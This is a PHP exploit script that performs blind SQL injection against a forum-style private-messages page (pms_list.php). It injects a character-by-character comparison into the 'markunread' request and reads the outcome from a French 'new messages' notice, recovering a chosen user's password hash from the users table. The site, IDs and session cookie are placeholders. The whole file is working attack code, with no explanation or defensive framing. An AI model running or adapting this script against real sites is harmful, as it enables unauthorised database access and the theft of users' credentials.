<?php

/*

Exploit For [WEBSITE_NAME]
Exploit blind sql injection from the private messages
*/

$userIdPlaceholder = "[USER_ID_PLACEHOLDER]";
$messageIdPlaceholder = "[MESSAGE_ID_PLACEHOLDER]";
$characterSet = "0123456789abcdef";
$cookiePlaceholder = "[COOKIE_DATA_PLACEHOLDER]";

function injectMessageMark($position, $value) {
    global $cookiePlaceholder, $messageIdPlaceholder, $userIdPlaceholder;

    $injectionString = $messageIdPlaceholder.') AND (ord(substring((select password from users where id='.$userIdPlaceholder.'),'.$position.',1))='.$value.') AND (1)=(1)';
    $postData = 'box=0&selected_messages%5B%5D='.$injectionString.'&action=markunread';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://[WEBSITE_URL_PLACEHOLDER]/pms_list.php");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_COOKIE, $cookiePlaceholder);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $responsePage = curl_exec($ch);
    curl_close($ch);
}

function fetchPage($url) {
    global $cookiePlaceholder;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_GET, true);
    curl_setopt($ch, CURLOPT_COOKIE, $cookiePlaceholder);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

$characterSetLength = strlen($characterSet);

for ($charPos = 1; $charPos <= 40; $charPos++) {
    fetchPage("http://[WEBSITE_URL_PLACEHOLDER]/pms_list.php?mid=".$messageIdPlaceholder."&box=0&p=1");
    for ($i = 0; $i < $characterSetLength; $i++) {
        $asciiValue = ord($characterSet[$i]);
        injectMessageMark($charPos, $asciiValue);
        
        $newResponse = fetchPage("http://[WEBSITE_URL_PLACEHOLDER]/pms_list.php");
        if (strstr($newResponse, "Il y a des nouveaux messages")) {
            echo chr($asciiValue);
            break;
        }
    }
}
